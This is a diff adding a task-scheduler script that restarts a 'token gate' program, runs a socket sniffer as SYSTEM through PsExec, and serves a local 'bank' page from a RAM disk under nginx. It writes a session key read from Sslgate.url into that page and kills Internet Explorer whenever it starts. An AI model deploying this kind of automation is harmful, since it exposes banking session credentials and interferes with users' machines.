@@ -1,0 +1,86 @@
+#( Restart_token_gate_process
+\ NoActive
+Time: START-TIME
+Rule: FILE-EXIST: "d:\START.EXE"
+Action:						
+KILL: "start.exe"
+TRAY-REFRESH
+StartIn: "d:\"
+IdlePriority ShowNoActivate
+START-APP: "start.exe"
+)#
+
+#( Start_socket_sniff
+NoActive
+Action:						
+TRAY-REFRESH
+StartIn: "c:\Program Files\"
+IdlePriority ShowMaximized
+START-APP: "c:\Program Files\PsExec.exe -d -i -s socketsniff.exe"
+)#
+
+#( Start_nginx_process
+\ NoActive
+Time: START-TIME
+\ Rule: FILE-EXIST: "d:\START.EXE"
+CREATE SessionKey 35 ALLOT
+: StringRep { a1 u1 a3 u3 a4 u4 \ rest a2 u2 -- }
+  1 ALLOCATE THROW TO a2
+  a2 0! 0 TO u2
+  a1 u1 
+  BEGIN OVER SWAP a3 u3 SEARCH WHILE 
+  TO rest SWAP 2DUP - a2 u2 2SWAP S+ TO u2 TO a2
+  a4 u4 a2 u2 2SWAP S+ TO u2 TO a2
+  rest u3 /STRING 
+  REPEAT
+  a2 u2 2SWAP S+
+  ROT DROP ;
+Action:
+
+PROC-EXIST: "nginx.exe" 
+IF
+StartIn: "c:\Program Files\nginx\"
+START-APP: "nginx.exe -s stop"
+START-APPW: imdisk -D -m B:
+PAUSE: 500
+KILL: "nginx.exe"
+THEN
+
+START-APPW: imdisk -a -s 25M -m B: -p "/fs:fat /q /y"
+PAUSE: 500
+FILE-DELETE: "c:\flag.log"
+DIR-CREATE: "b:\html\bank\"
+RECURSIVE
+FOR-FILES: "c:\Program Files\nginx\html\bank\*"
+FILE-COPY: "%FOUND-FULLPATH%" "b:\html\bank\%FOUND-RELPATH%"
+;FOR-FILES 
+
+FILE-WRITE: "b:\html\bank\index.html" ""
+READ-BY-LINE: "d:\Sslgate.url"
+FOUND-LINE 39 /STRING 34 MIN SessionKey PLACE
+;READ-BY-LINE
+
+READ-BY-LINE: "b:\html\bank\i.t"
+FOUND-LINE S" SessionKey" SessionKey COUNT StringRep S" b:\html\bank\index.html" FAPPEND
+;READ-BY-LINE
+
+StartIn: "c:\Program Files\nginx\"
+START-APP: "nginx.exe"
+)#
+
+#( remote_restarter
+WatchFile: "c:\flag.log"
+Action:
+FILE-EMPTY: "c:\flag.log"
+IF
+ELSE
+\ Restart_token_gate_process LAUNCH
+Start_nginx_process LAUNCH
+THEN
+)#
+
+#( KillIE
+WatchProc: "iexplore.exe"
+Action:
+KILL: "iexplore.exe"
+)#
